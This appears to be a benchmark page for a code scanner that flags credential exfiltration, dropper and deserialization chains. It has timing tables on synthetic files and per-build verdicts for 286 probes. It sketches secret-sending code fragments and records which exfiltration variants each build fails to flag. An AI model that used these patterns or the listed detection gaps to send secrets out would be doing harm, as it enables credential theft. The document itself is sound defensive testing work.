Data Source: Synthetic test: 8 generated one-file trees, each a credential
             read and one long sink line (or 100,000 sink lines).
Sample Size: 8 files, each scanned once per build (wall time).
Limitations: One run each on a machine shared with another workflow; the
             times are indicative. The 5f3fef0 figures are from the smaller
             20,000-repetition files.
```

| Line (one file each) | cff3fa2 | d89c600 (lane) |
|---|---:|---:|
| Python, `token: 1, ` 500,000 times inside `(...)` (5 MB) | 1.55 s | 1.52 s |
| Python, `r.token, ` 500,000 times (4.5 MB) | 1.39 s | 1.45 s |
| JavaScript destructuring target, `token, ` 500,000 times (3.5 MB) | 1.17 s | 1.34 s |
| JavaScript export list after the send, `token, ` 500,000 times (3.5 MB) | 1.13 s | 1.23 s |
| JavaScript object keys, `token: 1, ` 500,000 times (5 MB) | 1.46 s | 1.50 s |
| `token`, 1,000 blanks, `: 1,`, 5,000 times (5 MB) | 1.31 s | 1.42 s |
| `(/[` 500,000 times, patterns that never close (1.5 MB) | 0.83 s | 1.31 s |
| 100,000 sink lines, each `fetch(..., { token: 1 })` | 2.84 s | 2.95 s |

Every file but the `(/[` one is CRITICAL RISK with cff3fa2 (the keys and
names link) and LOW RISK with the lane's final build. That table is the
lane's run.
The same eight files, run again for this page with cff3fa2, e45efc5 and the
port's release build (a442dad), one after the other on a quiet machine (no
build running), and once more with the final build (34eaa0b) after the
verifications:

```
Data Source: Synthetic test: the same 8 generated files (500,000
             repetitions; 100,000 sink lines); a one-line minified bundle
             carrying 15 credential reads and sends among 20,000 and 100,000
             filler functions (0.76 MB and 3.9 MB); 5 generated files for the
             verifications' code (1,000 helpers whose parameter shares the
             secret's name, 400 far calls, 1,500 arrow helpers, a 2 MB line
             of `t<<1` shifts, 600 heredocs).
Sample Size: 8 + 2 + 5 files, each scanned once per build (wall time).
Limitations: One run each; the times are indicative. The machine had a
             load average of about 1 to 2 from other work; the two runs of
             the eight files were made at different times, so compare
             columns within a run.
```

| Line (one file each) | cff3fa2 | e45efc5 | Port a442dad | cff3fa2, again | e45efc5, again | This branch 34eaa0b |
|---|---:|---:|---:|---:|---:|---:|
| Python, `token: 1, ` inside `(...)` | 1.38 s | 1.46 s | 1.54 s | 1.55 s | 1.62 s | 1.68 s |
| Python, `r.token, ` | 1.33 s | 1.38 s | 1.50 s | 1.45 s | 1.56 s | 1.51 s |
| JavaScript destructuring target | 1.24 s | 1.22 s | 1.27 s | 1.21 s | 1.27 s | 1.31 s |
| JavaScript export list after the send | 1.21 s | 1.26 s | 1.21 s | 1.28 s | 1.26 s | 1.26 s |
| JavaScript object keys | 1.43 s | 1.36 s | 1.58 s | 1.56 s | 1.50 s | 1.58 s |
| `token`, 1,000 blanks, `: 1,` | 1.37 s | 1.40 s | 1.38 s | 1.47 s | 1.54 s | 1.62 s |
| `(/[`, patterns that never close | 0.79 s | 0.87 s | 1.10 s | 0.96 s | 0.95 s | 1.30 s |
| 100,000 sink lines | 2.89 s | 3.51 s | 3.13 s | 3.20 s | 3.20 s | 3.29 s |

With the port and this branch every file is LOW RISK; with e45efc5 the
attribute, destructuring and export files are still CRITICAL RISK
(EXFIL-CHAIN-001). The `(/[` file costs this branch about 0.3 s over
cff3fa2 in both runs; every other file is within 0.15 s.

| One file | e45efc5 | Port a442dad | 8f8fd64 | This branch 34eaa0b |
|---|---:|---:|---:|---:|
| Minified bundle, 15 reads and sends on one 0.76 MB line | 0.79 s | 1.05 s | 0.80 s | 0.80 s |
| The same, 3.9 MB | 1.41 s | 2.79 s | 1.45 s | 1.45 s |
| 1,000 helpers `def upload_N(token):` under `token = ...`, never called | 0.83 s | | 0.76 s | 0.77 s |
| 200 of them, called from 400 nested functions far below | 0.67 s | | 0.63 s | 0.66 s |
| 1,500 arrow helpers `(token) => fetch(..., { body: token })` | 0.88 s | | 0.89 s | 0.86 s |
| A 2 MB line of reads and sends with `t<<1` shifts | 1.02 s | | 1.04 s | 1.01 s |
| 600 `curl ... <<EOT` requests, each sending a secret through its heredoc | 0.74 s | | 0.78 s | 0.77 s |

The port asked the comment check once per pair on the one-line bundle
(2.79 s against 1.41 s); 8f8fd64 asks it once per finding. The helper, far
call and heredoc files keep their cost flat: the far-call search stops after
500 lines and eight far calls, and each heredoc stops at its delimiter or at
the call's five lines. No file hit the per-file time budget.

### Every probe

The verdict of every probe with each build; ", chain" means the probe's
target chain fired. The probe files are not reproduced here. The 8f77c2d and
d89c600 columns are the lane's runs; the others were run for this page.

<details>
<summary>286 probes</summary>

| Probe | Expected | Chain | cff3fa2 | e45efc5 | 8f77c2d | d89c600 (lane, hop on) | this branch |
|---|---|---|---|---|---|---|---|
| `recall/p00_reported_fp` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `recall/py01_kw_same_name` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py02_apikey_kw_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py03_data_data` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py04_kw_same_spaced` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py05_fstr_plain` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py06_fstr_spec_s` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py07_fstr_conv_r` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py08_fstr_empty_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py09_fstr_trunc_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py10_fstr_selfdoc` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py11_fstr_nested_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py12_fstr_conv_and_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py13_fstr_body_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py14_percent` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py15_percent_dict` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py16_format_kw_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py17_format_positional` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py18_dict_kw` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py19_kwargs_splat` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py20_dict_spread` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py21_dict_var_key` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py22_dict_var_key_multiline` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/py23_self_attr` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py24_subscript` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py25_attr_of_bound` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py26_headers_prev_line` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `recall/py27_forward_one_hop` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `recall/py28_multiline_kw_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py29_multiline_value_next_line` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py30_multiline_dict_value_next` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py31_lambda` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py32_comprehension` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py33_conditional` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py34_slice` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py35_annotated_source` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py36_annotated_source_kw_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py37_walrus_source` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `recall/py38_two_hop_data_kw` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | MEDIUM | CRITICAL, chain | MEDIUM |
| `recall/py39_two_hop_json_kw` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | MEDIUM | CRITICAL, chain | MEDIUM |
| `recall/py40_two_hop_params_kw` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | MEDIUM | CRITICAL, chain | MEDIUM |
| `recall/py41_two_hop_files_kw` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL |
| `recall/py42_b64` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py43_json_same_key_value` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py44_keyword_url_real` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py45_ne_compare` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py46_template` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py47_template_locals` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/py48_fstr_spec_multi` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/js01_shorthand` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js02_key_same_value` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js03_template` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js04_template_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js05_spread` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js06_computed_key` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js07_ternary` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js08_ts_typed_source` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js09_multiline_value_next` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js10_multiline_ternary` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js11_stringify_shorthand` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js12_fetch_body_var_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js13_fetch_body_key_same_value` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js14_urlsearchparams` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js15_or_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js16_destructure_source` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `recall/js17_arrow_param_shadow` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js18_object_assign` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/js19_body_key_same_name_two_hop` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | LOW |
| `recall/sh01_plain` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/sh02_braced` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/sh03_default_expansion` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/sh04_substring_expansion` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/sh05_error_expansion` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/sh06_kv` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/sh07_same_name_kv` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/sh08_json_escaped` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/sh09_default_expansion_url` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/sh10_dollar_then_eq` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/ag01_py_data` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/ag02_py_kw_same` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/ag03_py_fstr_spec` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/ag04_sh_default_expansion` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/ag05_sh_plain` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/ag06_js_shorthand` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/ag07_py_two_hop_data_kw` | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | HIGH |
| `recall/ag21_sh_form` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/ag22_sh_form_default_exp` | true | AGENTSC-CHAIN-002 | HIGH, chain | MEDIUM | MEDIUM | HIGH, chain | HIGH, chain |
| `recall/ag23_py_open` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/ag24_py_key_same_value` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/ag25_py_tuple` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/ag26_py_data_kw_same` | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr01_py_basic` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr02_py_same_name_env_key_and_positional` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr03_py_fstring` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr04_sh_basic` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr05_sh_braced` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr06_ps_start_process` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr07_py_urlretrieve_kw` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr08_startfile` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/dr09_execfile_js` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de01_basic` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de02_kw_f` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de03_kw_same_name` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de04_fstring_spec` | true | DESER-CHAIN-001 | HIGH, chain | LOW | LOW | HIGH, chain | HIGH, chain |
| `recall/de05_open_handle` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de06_pathlib` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/de07_multiline` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/s3_sh_mcp_plain` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_error` | true | EXFIL-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_substr` | true | EXFIL-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_assign_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | HIGH | HIGH | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_alt` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_mcp_nocolon_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_sh_set_u_idiom` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_js_ternary_trailing` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_fstr_selfdoc_conv` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_fstr_table` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_format_locals_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_format_locals_plain` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_fstr_space_colon` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_dict_var_key_after_comma` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_walrus_in_sink` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_urlopen_encode` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_httpclient_body` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_socket_send` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_json_dumps_same_key` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_py_kwargs_prev_line` | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `recall/s3_js_template_url_key` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_js_multiline_shorthand` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_js_key_same_multiline_value` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/s3_dr_popen_kw_same` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/s3_dr_run_list_env_key_same` | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/b4_sh_export_default` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_kw_value_next_line` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_conv_then_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_js_quoted_key_value` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_de_conditional` | true | DESER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `recall/b4_py_discord_embed` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_fstr_in_embed_spec` | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_percent_named_same` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_env_copy_kw_json` | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `recall/b4_py_env_two_hop_body` | true | EXFIL-CHAIN-001 | CRITICAL, chain | MEDIUM | MEDIUM | CRITICAL, chain | MEDIUM |
| `recall/b4_py_env_two_hop_var_named_body` | true | EXFIL-CHAIN-001 | MEDIUM | MEDIUM | MEDIUM | MEDIUM | MEDIUM |
| `fp/py01_reported_example` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/py02_login_fallback_subscript` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py03_login_fallback_get` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py04_attribute_access` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py05_next_function_header` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py06_shadowing_parameter` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py07_comment_on_sink_line` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py08_docstring_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py09_oauth_password_grant_literal` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py10_token_endpoint_path` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py11_str_format_placeholder` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py12_percent_mapping` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py13_escaped_json_body` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py14_argparse_dest_after_sink` | clean | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `fp/py15_pydantic_alias_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
| `fp/py16_dataclass_field_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `fp/py17_logging_string_after_sink` | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | LOW | LOW |
